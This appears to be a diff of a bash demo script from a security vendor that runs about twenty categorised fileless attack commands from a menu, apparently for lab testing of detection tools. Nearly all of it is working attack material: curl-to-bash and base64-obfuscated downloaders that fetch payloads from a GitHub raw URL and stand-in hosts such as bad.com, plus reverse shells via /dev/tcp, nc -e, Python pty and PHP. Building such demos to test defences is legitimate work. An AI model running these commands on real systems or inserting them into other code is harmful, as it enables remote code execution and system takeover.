@@ -1,98 +1,109 @@
 #!/usr/bin/env bash
 # ============================================================
-#  fileless-execution-demo.sh
-#  Purpose : Show 20 different fileless attacks (categorized)
-#  Author  : Lior Boehm   –  Upwind Security demo
+#   fileless-execution-demo.sh
+#   Purpose : 20 file-less attacks (categorised) for lab tests
+#   Author  : Lior Boehm  –  Upwind Security demo
 # ============================================================
-set -euo pipefail
+set -eo pipefail   # (no -u → avoids unbound-var crashes)
 
-# Colors
-BOLD="\e[1m"
-CYAN="\e[36m"
-GREEN="\e[32m"
-YELLOW="\e[33m"
-RESET="\e[0m"
+######################## 🎨  COLOURS  #########################
+BOLD=$'\e[1m';  RESET=$'\e[0m'
+CYAN=$'\e[36m'; GREEN=$'\e[32m'; YELLOW=$'\e[33m'; RED=$'\e[31m'
 
-# Banner
+######################## 🖼️  BANNER  ##########################
 clear
-command -v figlet >/dev/null && figlet "upwind.io" || echo -e "\nUPWIND.IO"
+command -v figlet >/dev/null && figlet "upwind.io" || echo "UPWIND.IO"
 echo -e "${CYAN}${BOLD}Fileless Execution Demonstration  –  Lior Boehm${RESET}\n"
 
-# Config
+######################## ⚙️  LAB CONFIG  ######################
 LHOST="127.0.0.1"
-LPORT1="4444"
-LPORT2="5555"
-LPORT3="9001"
+LPORT1="4444"; LPORT2="5555"; LPORT3="9001"
+RAW="https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main"
 
-# Categorized commands
-declare -A categories
+##################### 🗂️  CATEGORY ARRAYS  ####################
+##  All payload lines are quoted in single quotes so nothing
+##  executes or expands UNTIL you actually select it.
 
-categories[Downloaders]="
-curl -s http://example.com/script.sh | bash
-exec 3< <(curl -s http://bad.com/payload.sh); bash /proc/self/fd/3
-X=\$(curl -s http://cryptojacker.org/liorpayload.py); python3 -c \"\$X\"
-bash -c \"\$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/payload.sh)\"
-"
+## 1️⃣  Downloaders
+DOWNLOADERS=(
+'curl -s "'"$RAW"'/payload.sh" | bash'
+'exec 3< <(curl -s "'"$RAW"'/payload.sh"); bash /proc/self/fd/3'
+'X=$(curl -s "'"$RAW"'/test.py"); python3 -c "$X"'
+'bash -c "$(curl -s '"$RAW"'/payload.sh)"'
+)
 
-categories[Encoding]="
-echo 'ZXhlYyAiQjY0IHBheWxvYWQgc3VjY2VzcyIK' | base64 -d | bash
-bash -c \"\$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/b64.txt | base64 -d)\"
-bash -c \"\$(echo 'ENFUGBYY' | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 -d)\"
-exec 8< <(openssl enc -d -base64 <<< L2Jpbi9zaCAtYyBlY2hvIGhlbGxv); bash /proc/self/fd/8
-"
+## 2️⃣  Encoding / Obfuscation
+ENCODING=(
+'echo ZWNobyAiQjY0IHBheWxvYWQgc3VjY2VzcyIK | base64 -d | bash'
+'bash -c "$(curl -s '"$RAW"'/b64.txt | base64 -d)"'
+'bash -c "$(echo ENFUGBYY | tr A-Za-z N-ZA-Mn-za-m | base64 -d)"'
+'exec 8< <(echo ZWNobyBoZWxsbw== | base64 -d); bash /proc/self/fd/8'
+)
 
-categories[ReverseShells]="
-timeout 2s bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT1} 0>&1' &
-timeout 2s nc -e /bin/sh ${LHOST} ${LPORT1} &
-timeout 2s python3 -c 'import os,pty,socket; s=socket.socket(); s.connect((\"${LHOST}\",${LPORT2})); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"/bin/sh\")' &
-timeout 2s php -r '$s=fsockopen(\"${LHOST}\",7777);exec(\"/bin/sh -i <&3 >&3 2>&3\");' &
-timeout 2s bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT3} 0>&1' &
-"
+## 3️⃣  Reverse shells  (all timeout-limited)
+REVERSE_SHELLS=(
+'timeout 2s bash -c "bash -i >& /dev/tcp/'"$LHOST"'/'"$LPORT1"' 0>&1" &'
+'timeout 2s nc -e /bin/sh '"$LHOST"' '"$LPORT1"' &'
+'timeout 2s python3 -c "import os,pty,socket; s=socket.socket(); s.connect((\"'"$LHOST"'\",'"$LPORT2"')); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"/bin/sh\")" &'
+'timeout 2s php -r '\''
+$s=fsockopen("'"$LHOST"'",7777);exec("/bin/sh -i <&3 >&3 2>&3");'\'' &'
+'timeout 2s bash -c "bash -i >& /dev/tcp/'"$LHOST"'/'"$LPORT3"' 0>&1" &'
+)
 
-categories[AdvancedFD]="
-exec 3< <(echo 'hs.doaolyp/moc.dab//:ptth' | rev | xargs curl -s); bash /proc/self/fd/3
-exec 3< /bin/bash; /proc/self/fd/3 -c 'echo executed FD shell'
-exec {FD}<>/dev/tcp/${LHOST}/9898; echo whoami >&\$FD; cat <&\$FD &
-exec 9< <(dd if=/dev/zero bs=0 count=0 | curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/shell.sh); bash /proc/self/fd/9
-bash -c \"\$(python3 -c 'import urllib.request, base64; exec(base64.b64decode(urllib.request.urlopen(\"https://raw.githubusercontent.com/liorbm/fileless-execution-demo/refs/heads/main/b64.txt\").read()).decode())')\"
-"
+## 4️⃣  Advanced FD / Tricks
+ADVANCED_FD=(
+'exec 3< <(echo hs.doaolyp/moc.dab//:ptth | rev | xargs curl -s); bash /proc/self/fd/3'
+'exec 3< /bin/bash; /proc/self/fd/3 -c "echo FD-spawned shell"'
+'exec {FD}<>/dev/tcp/'"$LHOST"'/9898; echo whoami >&$FD; cat <&$FD &'
+'exec 9< <(dd if=/dev/zero bs=0 count=0 | curl -s '"$RAW"'/shell.sh); bash /proc/self/fd/9'
+'python3 -c "import urllib.request,base64,sys; exec(base64.b64decode(urllib.request.urlopen(\"'"$RAW"'/b64.txt\").read()))"'
+)
 
-print_menu() {
-  echo -e "${YELLOW}${BOLD}\n=========== MAIN MENU ===========${RESET}"
+##################### 📑  CATEGORY INDEX  #####################
+declare -A GROUPS=(
+  [1]="Downloaders"
+  [2]="Encoding"
+  [3]="Reverse_Shells"
+  [4]="Advanced_FD"
+)
+
+################### 🚀  EXECUTION HELPERS  ####################
+run_cmd() {
+  local cmd="$1"
+  echo -e "${CYAN}[>] ${cmd}${RESET}"
+  bash -c "$cmd" &
+  sleep 0.5          # tiny gap so output is readable
+}
+
+run_group() {
+  local -n arr=$1    # nameref to array
+  local gname=$2
+  echo -e "\n${GREEN}${BOLD}=== $gname ===${RESET}"
+  for c in "${arr[@]}"; do run_cmd "$c"; done
+}
+
+#################### 🖥️  MAIN MENU LOOP  ######################
+while true; do
+  echo -e "\n${YELLOW}${BOLD}=========== MAIN MENU ===========${RESET}"
   echo "  1) Downloaders"
-  echo "  2) Encoding"
-  echo "  3) ReverseShells"
-  echo "  4) AdvancedFD"
+  echo "  2) Encoding / Obfuscation"
+  echo "  3) Reverse Shells"
+  echo "  4) Advanced FD Tricks"
   echo "  a) Run ALL attacks"
   echo "  q) Quit"
-}
+  read -rp $'\nChoose an option: ' opt
 
-run_category() {
-  local cat=$1
-  echo -e "\n${GREEN}[*] Running category: $cat${RESET}"
-  local IFS=$'\n'
-  local cmds=( $(echo -e "${categories[$cat]}" | sed '/^$/d') )
-  for cmd in "${cmds[@]}"; do
-    echo -e "\n${CYAN}[>] $cmd${RESET}"
-    bash -c "$cmd" &
-    sleep 1
-  done
-}
-
-while true; do
-  print_menu
-  read -rp $'\nChoose category: ' choice
-  case "$choice" in
-    1) run_category Downloaders ;;
-    2) run_category Encoding ;;
-    3) run_category ReverseShells ;;
-    4) run_category AdvancedFD ;;
-    [Aa])
-      for cat in "${!categories[@]}"; do
-        run_category "$cat"
-      done
-      ;;
+  case "$opt" in
+     1) run_group DOWNLOADERS    "${GROUPS[1]}" ;;
+     2) run_group ENCODING       "${GROUPS[2]}" ;;
+     3) run_group REVERSE_SHELLS "${GROUPS[3]}" ;;
+     4) run_group ADVANCED_FD    "${GROUPS[4]}" ;;
+    [Aa])                         # all categories
+         run_group DOWNLOADERS    "${GROUPS[1]}"
+         run_group ENCODING       "${GROUPS[2]}"
+         run_group REVERSE_SHELLS "${GROUPS[3]}"
+         run_group ADVANCED_FD    "${GROUPS[4]}";;
     [Qq]) echo -e "${BOLD}Exiting.${RESET}"; exit 0 ;;
-    *) echo "Invalid choice" ;;
+       *) echo -e "${RED}Invalid choice${RESET}" ;;
   esac
 done
